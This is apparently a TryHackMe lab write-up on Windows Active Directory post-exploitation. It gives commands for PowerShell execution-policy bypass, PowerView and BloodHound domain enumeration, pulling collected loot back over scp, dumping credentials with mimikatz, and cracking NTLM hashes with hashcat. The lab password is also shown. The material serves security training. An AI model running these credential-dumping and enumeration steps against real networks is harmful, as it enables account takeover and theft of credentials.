# Post-Exploitation Basics

**Room Link:** [https://tryhackme.com/room/postexploit](https://tryhackme.com/room/postexploit)



## Presteps for Lab

### SharpHound Installation

SharpHound version on the box is too old for the current version of Bloodhound so I had to update it.

**Kali**

```
git clone https://github.com/BloodHoundAD/BloodHound.git

scp -r BloodHound/Collectors/SharpHound.ps1 Administrator@$VICTIM:C:/Users/Administrator/
Password: P@$$W0rd
```

Added this line to SharpHound.ps1 before transfering so I could run the command right away

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**&#x20;

```
powershell -ep bypass
.\SharpHound.ps1
```

### BloodHound Installation

```
apt-get install bloodhound
neo4j console
```

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Powerview

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```



**Victim**

Run below to be able to run PowerView commands.

```
powershell -ep bypass
. .\Downloads\PowerView.ps1
```

Enumerate the domain users.

```
Get-NetUser | select cn
```

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

Enumerate the domain groups.

```
Get-NetGroup -GroupName *admin*
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Find Shared folders.

```
Invoke-ShareFinder
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Get Operating systems on the network.

```
Get-NetComputer -fulldata | select operatingsystem
```

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Bloodhound

Setup and get loot with Bloodhound.

**Victim**

```
powershell -ep bypass
. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```



Transfer Bloodhound results back to Kali. SCP can be used in this case

**Kali**

```
scp Administrator@$VICTIM:C:/Users/Administrator/20230212071833_loot.zip loot.zip
Password: P@$$W0rd
```

### Mapping the network w/ BloodHound

```
bloodhound --no-sandbox
```

We can just drag the zip file to bloodhound to import it.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Find all Domain Admins

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

List all Kerberostable accounts

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

## Dumping hashes w/ mimikatz

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```

**Victim**

```
cd Downloads && mimikatz.exe
```

**Victim - Mimikatz**

```
privilege::debug
lsadump::lsa /patch
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Copy to Kali output back to Kali

****![](<../../.gitbook/assets/image (3).png>)****

Output only the hashes and remove all duplicates into a new file.

**Kali**

```
cat hashes.txt | grep NTLM | awk -F ":" '{print $2}' | grep "\S" | sed 's/^[ \t]*//'  | sort | uniq > hash.txt
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
